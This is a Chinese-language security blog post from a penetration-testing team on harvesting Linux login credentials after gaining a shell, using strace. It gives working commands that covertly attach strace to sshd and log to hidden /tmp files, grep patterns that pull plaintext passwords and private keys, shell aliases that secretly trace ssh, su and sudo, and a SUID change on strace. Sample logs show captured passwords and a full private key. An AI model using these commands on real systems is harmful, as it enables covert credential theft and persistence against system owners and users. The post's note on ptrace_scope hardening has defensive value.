<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>linux后渗透之收集登录凭证 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">linux后渗透之收集登录凭证</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">linux后渗透之收集登录凭证</h1><div class="post-meta">2020-06-17<span> | </span><span class="category"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2.6k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 11</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#strace简介"><span class="toc-number">1.</span> <span class="toc-text">strace简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装strace"><span class="toc-number">1.1.</span> <span class="toc-text">安装strace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strace使用条件"><span class="toc-number">1.2.</span> <span class="toc-text">strace使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strace语法"><span class="toc-number">1.3.</span> <span class="toc-text">strace语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#收集任意已有进程登录凭证"><span class="toc-number">2.</span> <span class="toc-text">收集任意已有进程登录凭证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取sshd进程明文密码"><span class="toc-number">2.1.</span> <span class="toc-text">获取sshd进程明文密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取sshd进程私钥"><span class="toc-number">2.2.</span> <span class="toc-text">获取sshd进程私钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#收集任意指定程序登录凭证"><span class="toc-number">3.</span> <span class="toc-text">收集任意指定程序登录凭证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#收集ssh登录凭证"><span class="toc-number">3.1.</span> <span class="toc-text">收集ssh登录凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#收集su、sudo等需要提升权限运行的程序的登录凭证"><span class="toc-number">3.2.</span> <span class="toc-text">收集su、sudo等需要提升权限运行的程序的登录凭证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="post-content"><p><strong>Author:last0monster</strong></p>
<p>当渗透测试人员拿到shell后，如果要进一步渗透，信息收集是重中之重，内网渗透的深入程度取决于信息收集的深度，内网渗透的本质就是信息收集，而登录凭证的收集是信息收集的重点方向。关于linux系统下登录凭证收集的文章多为翻查文件。本文将研究linux系统下的通过调试程序的方法，跟踪进程数据的方式收集登录凭证。</p>
<p>strace是linux中的调试工具，可通过附加到进程来调试正在运行的进程，strace记录一个正在运行的程序正在执行的系统调用以及参数。我们可以通过这种方式来跟踪任何进程数据，比如<code>sshd ssh su sudo</code>等进程数据来获取登录凭证。</p>
<p>例如，如果一个应用程序（例如Pidgin）遭到入侵，攻击者就有可能附加到其他正在运行的进程（例如Firefox，SSH会话，GPG代理等）以提取其他凭证并继续扩大范围，无需借助用户协助的网络钓鱼就可以进行攻击。</p>
<h2 id="strace简介"><a href="#strace简介" class="headerlink" title="strace简介"></a>strace简介</h2><h3 id="安装strace"><a href="#安装strace" class="headerlink" title="安装strace"></a>安装strace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 能出网</span><br><span class="line">yum install strace -y</span><br><span class="line">apt install strace -y</span><br><span class="line"># 不能出网</span><br><span class="line">上传对应安装包，手工安装，或者编译安装</span><br></pre></td></tr></table></figure>
<h3 id="strace使用条件"><a href="#strace使用条件" class="headerlink" title="strace使用条件"></a>strace使用条件</h3><p>Linux Kernel 3.4及更高版本支持完全限制或禁用ptrace的功能。这可以通过使用sysctl将kernel.yama.ptrace_scope设置为1、2或3来完成。默认情况下，大多数发行版都将其设置为1。根据Linux Kernel Yama Documentation，这些数字映射到以下权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0-经典ptrace权限：进程可以将PTRACE_ATTACH传递给任何其他进程，只要它是可转储的（即没有转换uid，没有特权启动或没有调用prctl（PR_SET_DUMPABLE ...）。同样，PTRACE_TRACEME为不变。</span><br><span class="line"></span><br><span class="line">1-受限制的ptrace：进程必须具有预定义的关系下一个它想调用PTRACE_ATTACH。默认情况下，当上面的关系时，这种关系只是其后代的关系也符合经典标准。要改变关系，下级可以调用prctl（PR_SET_PTRACER，debugger，...）进行声明允许的调试器PID调用劣质的PTRACE_ATTACH。使用PTRACE_TRACEME不变。</span><br><span class="line"></span><br><span class="line">2-仅限管理员附加：只有具有CAP_SYS_PTRACE的进程才能使用ptrace，通过PTRACE_ATTACH，或通过子级调用PTRACE_TRACEME。</span><br><span class="line"></span><br><span class="line">3-没有连接：任何进程都不能将ptrace与PTRACE_ATTACH一起使用，也不能通过PTRACE_TRACEME。设置后，该sysctl值将无法更改。</span><br></pre></td></tr></table></figure>

<p>这样可以通过运行<code>sysctl kernel.yama.ptrace_scope=3</code>在系统上禁用ptrace。但是，这可能会破坏正在运行的其他程序。例如，Wine在禁用ptrace的情况下无法正常工作。我建议您测试非生产服务器，并验证其所有功能在未启用ptrace的情况下能否正常运行。禁用ptrace还可以阻止某些调试功能。</p>
<p><strong>查看修改系统strace配置</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看</span><br><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope</span><br><span class="line"># 修改</span><br><span class="line">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope 或者 sysctl kernel.yama.ptrace_scope&#x3D;0</span><br><span class="line"># 当kernel.yama.ptrace_scope的值设置为3后，必须重启系统后才能更改</span><br></pre></td></tr></table></figure>
<h3 id="strace语法"><a href="#strace语法" class="headerlink" title="strace语法"></a>strace语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-c 统计每一系统调用的所执行的时间,次数和出错的次数等.</span><br><span class="line">-d 输出strace关于标准错误的调试信息.</span><br><span class="line">-f 跟踪由fork调用所产生的子进程.</span><br><span class="line">-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.</span><br><span class="line">-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.</span><br><span class="line">-h 输出简要的帮助信息.</span><br><span class="line">-i 输出系统调用的入口指针.</span><br><span class="line">-q 禁止输出关于脱离的消息.</span><br><span class="line">-r 打印出相对时间关于,,每一个系统调用.</span><br><span class="line">-t 在输出中的每一行前加上时间信息.</span><br><span class="line">-tt 在输出中的每一行前加上时间信息,微秒级.</span><br><span class="line">-ttt 微秒级输出,以秒了表示时间.</span><br><span class="line">-T 显示每一调用所耗的时间.</span><br><span class="line">-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.</span><br><span class="line">-V 输出strace的版本信息.</span><br><span class="line">-x 以十六进制形式输出非标准字符串</span><br><span class="line">-xx 所有字符串以十六进制形式输出.</span><br><span class="line">-a column 设置返回值的输出位置.默认 为40.</span><br><span class="line">-e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier&#x3D;][!]value1[,value2]...</span><br><span class="line">qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace&#x3D;open,表示只跟踪open调用.而-etrace!&#x3D;open 表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\.</span><br><span class="line">-e trace&#x3D;set 只跟踪指定的系统 调用.例如:-e trace&#x3D;open,close,rean,write表示只跟踪这四个系统调用.默认的为set&#x3D;all.</span><br><span class="line">-e trace&#x3D;file 只跟踪有关文件操作的系统调用.</span><br><span class="line">-e trace&#x3D;process 只跟踪有关进程控制的系统调用.</span><br><span class="line">-e trace&#x3D;network 跟踪与网络有关的所有系统调用.</span><br><span class="line">-e strace&#x3D;signal 跟踪所有与系统信号有关的 系统调用</span><br><span class="line">-e trace&#x3D;ipc 跟踪所有与进程通讯有关的系统调用</span><br><span class="line">-e abbrev&#x3D;set 设定strace输出的系统调用的结果集.-v 等与 abbrev&#x3D;none.默认为abbrev&#x3D;all.</span><br><span class="line">-e raw&#x3D;set 将指定的系统调用的参数以十六进制显示.</span><br><span class="line">-e signal&#x3D;set 指定跟踪的系统信号.默认为all.如 signal&#x3D;!SIGIO(或者signal&#x3D;!io),表示不跟踪SIGIO信号.</span><br><span class="line">-e read&#x3D;set 输出从指定文件中读出 的数据.例如: -e read&#x3D;3,5</span><br><span class="line">-e write&#x3D;set 输出写入到指定文件中的数据.</span><br><span class="line">-o filename 将strace的输出写入文件filename</span><br><span class="line">-p pid 跟踪指定的进程pid.</span><br><span class="line">-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.</span><br><span class="line">-u username 以username的UID和GID执行被跟踪的命令</span><br></pre></td></tr></table></figure>


<h2 id="收集任意已有进程登录凭证"><a href="#收集任意已有进程登录凭证" class="headerlink" title="收集任意已有进程登录凭证"></a>收集任意已有进程登录凭证</h2><p><code>strace -p</code>参数指定进程，收集对应进程的系统调用数据</p>
<h3 id="获取sshd进程明文密码"><a href="#获取sshd进程明文密码" class="headerlink" title="获取sshd进程明文密码"></a>获取sshd进程明文密码</h3><p>1.root权限执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用括号执行程序，当前shell退出，执行的程序不会退出</span><br><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>
<p>2.查找用户名和密码的正则表达式为<code>read\(6, &quot;.+\\0\\0\\0\\.+&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查找用户名和密码</span><br><span class="line">grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; &#x2F;tmp&#x2F;.sshd.log</span><br><span class="line"></span><br><span class="line"># 结果形式如下</span><br><span class="line">[pid  2401] 22:34:34 read(6, &quot;\10\0\0\0\4root&quot;, 9) &#x3D; 9</span><br><span class="line">[pid  2401] 22:34:34 read(6, &quot;\4\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0&quot;, 27) &#x3D; 27</span><br><span class="line">[pid  2401] 22:34:34 read(6, &quot;\f\0\0\0\4toor&quot;, 9) &#x3D; 9</span><br></pre></td></tr></table></figure>
<h3 id="获取sshd进程私钥"><a href="#获取sshd进程私钥" class="headerlink" title="获取sshd进程私钥"></a>获取sshd进程私钥</h3><p>1.root权限执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用括号执行程序，当前shell退出，执行的程序不会退出</span><br><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e trace&#x3D;read,write -s 4096 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>
<p>2.查找私钥直接搜索字符串<code>PRIVATE KEY</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 如果私钥设置的了密码，似乎不能抓到私钥密码</span><br><span class="line"># 查找用户名和密码</span><br><span class="line">grep &#39;PRIVATE KEY&#39; &#x2F;tmp&#x2F;.sshd.log</span><br><span class="line"></span><br><span class="line"># 结果形式如下</span><br><span class="line">[pid  1009] 23:17:34 read(4, &quot;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAtVes3uixVI&#x2F;KAJtERp4WHTfWt107sCQuyufQ&#x2F;2oYTzxYpAQKhsDY\nAFphRPKSudtdwtN65P9JTYXQpQiQg8m0B+rbSEe6Gl9Sv2fkfRJ+YRMtVx7sPJfJoY+X4q\n83w9igJ1NwRAfS+9zkA+99An8OlxRo76UJYkFBKDa7LY0a5sp4X7geOtwLqA+0n3ur8NPC\nT+QsCck+D886bxDEeGW0v1qTHsjgJVzuwq3OoA5qBWh+eOuKaeamvkMguk7JIUWSyECKo3\njjQvAw7&#x2F;IrRmzluENvU&#x2F;sriFICjk64GYa8CVkjiKfcmqZYerhXL5A1Doo1fxdYFCJi3Cwa\nCg6EIq8AF8lXm0Bhu2MD0iA7qtfgv8rqz&#x2F;Qvk58WZA4daQYQSm9PIZnKp2Kup5zKi7g8J6\nDjGCc9KgVtBl2plODRPukuOK&#x2F;m2xs7hqgD0OxQM+RU3yJiyg9HmsCDRnKUH7oNnqYfSBqa\niW7cfYcGsHD989ym0itOsme51tbYQbDsrZiPedexAAAFgB+gMcMfoDHDAAAAB3NzaC1yc2\nEAAAGBALVXrN7osVSPygCbREaeFh031rddO7AkLsrn0P9qGE88WKQECobA2ABaYUTykrnb\nXcLTeuT&#x2F;SU2F0KUIkIPJtAfq20hHuhpfUr9n5H0SfmETLVce7DyXyaGPl+KvN8PYoCdTcE\nQH0vvc5APvfQJ&#x2F;DpcUaO+lCWJBQSg2uy2NGubKeF+4HjrcC6gPtJ97q&#x2F;DTwk&#x2F;kLAnJPg&#x2F;P\nOm8QxHhltL9akx7I4CVc7sKtzqAOagVofnjrimnmpr5DILpOySFFkshAiqN440LwMO&#x2F;yK0\nZs5bhDb1P7K4hSAo5OuBmGvAlZI4in3JqmWHq4Vy+QNQ6KNX8XWBQiYtwsGgoOhCKvABfJ\nV5tAYbtjA9IgO6rX4L&#x2F;K6s&#x2F;0L5OfFmQOHWkGEEpvTyGZyqdirqecyou4PCeg4xgnPSoFbQ\nZdqZTg0T7pLjiv5tsbO4aoA9DsUDPkVN8iYsoPR5rAg0ZylB+6DZ6mH0gamolu3H2HBrBw\n&#x2F;fPcptIrTrJnudbW2EGw7K2Yj3nXsQAAAAMBAAEAAAGBAKkfkLD&#x2F;sUqdI5a3N9DoZNVxG0\nY9pIoc5KsF0gwzJWLYdA7bWfnc5lZF9Et6M880QFiQJSBm2jV7pGAWAbl3JvjvVv0tL+qi\nlii+uwDOe6ELYpDK3SWRplGP+uZF5as4X&#x2F;ztO1mnNmUA2IK3Gw518uSB+2&#x2F;sqjjBhQP9L0\npHPBycHfGfZEoeqJxfsWO&#x2F;0lazF5isw0mJLuFNskCdEa77o7uGvIjMbQdLib10naz2ZHiQ\nwMsDWT51B3OQZXh8O+ZU3ALJRTmB7YbHVPn6zkHjgIpH&#x2F;&#x2F;IKLj+vUmuvWQfEOFrmE9HVRq\n4eutR+xGImH&#x2F;ujvbItlsTYucSd8lvraKtfZoksWEYjzAh47Al57LgSiximhKaReMm9nWJy\nwvdsBW5UtEOb7haQ3wrUP8SZ3YGqzIswSIqz+vWDggYDNHVT+Tsbxd0xMe10VDHMj6kgJX\nzRLnI53nkL17uKZ0R1RFoN72+2xi3MSNhlrGz5OfjM3DEQuO9vUmAgvMwwRX2sYUjLQQAA\nAMEAu&#x2F;vaBCqXBQjrxgoQSUa6sR3sI69C&#x2F;3bNXUG1nJU0Ypugu4mqyUsQ0+ubY9vPvJHnUc\n09VY4AJtP5E8BYbt6dXs9eXi4R8c8kFwZ1Fm5W9sR5bYeC5A5&#x2F;e4of9maZRuD9xCiA26ET\nknaIDttfLzO4UqXxrVtd3JKuCL417wswqEnzmEMPn8SuePX8&#x2F;5e9uIF1P41txlNwLcVbkF\njJ&#x2F;FdiSvtkJSGhWPSdWU70Breix5JfvqYLthW9&#x2F;Z60vYtkplUxAAAAwQDf2qwcHKRL1Oou\n3zfeBvRDtljbr1016yPsLzv+ZLfZFC3NPqnNMlE4P8sxntw3l36k64DmTZvSkcgdePB8ZJ\neglrYkveKyHrLaf79xAcg7M8tzSBfQ0HXs9WCp1JSwcxcxK1wfFJ+0Y5C1ckd8v8cMb8+m\nNzCXSFikx71Wggxj5RhwwlvC4YKVhIGp4WGxQ8V+qtXmNoXXHEFpTpSraonA2cRF3kv3ZT\nSEIdJ6bme7f8QCRqc5lOZuj7raM3TjVskAAADBAM9iMAYNAmkQw7XDFLpYdGcZkPKDc7XX\nO1XdkqsiN4aC3JOrveb77QKKZw4A0Yed1JpVnsSFEteYJ5rgsHVZSBDaugNspybVQzcObz\nmgM+e4F6nQXOxgHXFpjzJ0TAg&#x2F;syG1DcpjzmhsKKGymTlNBNmy&#x2F;2Fu7QtvTU3pzAc6T0Im\n02u0NukMCcLfU08V5mEpi0Y0rkYzzCxihUNbkM9nY365ixVtaaX&#x2F;5DKCcuQPWpGs&#x2F;sChZe\npuzYc7LCnLR8alqQAAAAlyb290QGthbGk&#x3D;\n-----END OPENSSH PRIVATE KEY-----\n&quot;, 4096) &#x3D; 2590</span><br></pre></td></tr></table></figure>

<h2 id="收集任意指定程序登录凭证"><a href="#收集任意指定程序登录凭证" class="headerlink" title="收集任意指定程序登录凭证"></a>收集任意指定程序登录凭证</h2><p>给指定程序设置命令别名，使运行指定程序时自动strace读写系统调用，收集登录凭证</p>
<h3 id="收集ssh登录凭证"><a href="#收集ssh登录凭证" class="headerlink" title="收集ssh登录凭证"></a>收集ssh登录凭证</h3><p>1.添加命令别名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 添加命令别名</span><br><span class="line">vi ~&#x2F;.bashrc或者&#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -f -e trace&#x3D;read,write -o &#x2F;tmp&#x2F;.ssh-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -s 32 ssh&#39;</span><br><span class="line"># 使命令别名立即生效</span><br><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<p>2.记录的strace文件如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">936   write(4, &quot;root@192.168.168.20&#39;s password: &quot;, 32) &#x3D; 32</span><br><span class="line">936   read(4, &quot;t&quot;, 1)                   &#x3D; 1</span><br><span class="line">936   read(4, &quot;o&quot;, 1)                   &#x3D; 1</span><br><span class="line">936   read(4, &quot;o&quot;, 1)                   &#x3D; 1</span><br><span class="line">936   read(4, &quot;r&quot;, 1)                   &#x3D; 1</span><br><span class="line">936   read(4, &quot;\n&quot;, 1)                  &#x3D; 1</span><br><span class="line">936   write(4, &quot;\n&quot;, 1)                 &#x3D; 1</span><br></pre></td></tr></table></figure>
<p>3.可以通过正则<code>.+@.+\bpassword</code>定位密码位置</p>
<h3 id="收集su、sudo等需要提升权限运行的程序的登录凭证"><a href="#收集su、sudo等需要提升权限运行的程序的登录凭证" class="headerlink" title="收集su、sudo等需要提升权限运行的程序的登录凭证"></a>收集<code>su、sudo</code>等需要提升权限运行的程序的登录凭证</h3><p>1.给strace程序添加suid权限，即以root权限执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看strace文件位置</span><br><span class="line">which strace</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;strace</span><br><span class="line"># 添加suid权限</span><br><span class="line">chmod +s &#x2F;usr&#x2F;bin&#x2F;strace</span><br></pre></td></tr></table></figure>

<p>2.添加命令别名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 添加命令别名</span><br><span class="line">vi ~&#x2F;.bashrc或者&#x2F;etc&#x2F;bashrc</span><br><span class="line">alias sudo&#x3D;&#39;strace -f -e trace&#x3D;read,write -o &#x2F;tmp&#x2F;.sudo-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -s 32 sudo&#39;</span><br><span class="line">alias su&#x3D;&#39;strace -f -e trace&#x3D;read,write -o &#x2F;tmp&#x2F;.su-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -s 32 su&#39;</span><br><span class="line"># 使命令别名立即生效</span><br><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<p>3.记录的strace文件如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write(6, &quot;[sudo] password for kali: &quot;, 26) &#x3D; 26</span><br><span class="line">read(6, &quot;i&quot;, 1)                         &#x3D; 1</span><br><span class="line">read(6, &quot;l&quot;, 1)                         &#x3D; 1</span><br><span class="line">read(6, &quot;a&quot;, 1)                         &#x3D; 1</span><br><span class="line">read(6, &quot;k&quot;, 1)                         &#x3D; 1</span><br><span class="line">read(6, &quot;\n&quot;, 1)                        &#x3D; 1</span><br></pre></td></tr></table></figure>

<p>4.根据程序运行输出的特征字符串定位密码位置</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当linux系统配置文件<code>/proc/sys/kernel/yama/ptrace_scope</code>值不为<code>3</code>时，可以通过<code>strace</code>记录任何程序的系统调用（常用read、write调用）来获取登录凭证</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://klionsec.github.io/2016/09/22/strace/" target="_blank" rel="noopener">https://klionsec.github.io/2016/09/22/strace/</a></li>
<li><a href="https://blog.netspi.com/using-strace-to-monitor-ssh-connections-on-linux/" target="_blank" rel="noopener">https://blog.netspi.com/using-strace-to-monitor-ssh-connections-on-linux/</a></li>
<li><a href="https://www.kernel.org/doc/Documentation/security/Yama.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/security/Yama.txt</a></li>
</ul>
</div><div class="tags"><a href="/tags/Linux/"><i class="fa fa-tag"></i>Linux</a><a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/"><i class="fa fa-tag"></i>登陆凭证</a></div><div class="post-nav"><a class="next" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a 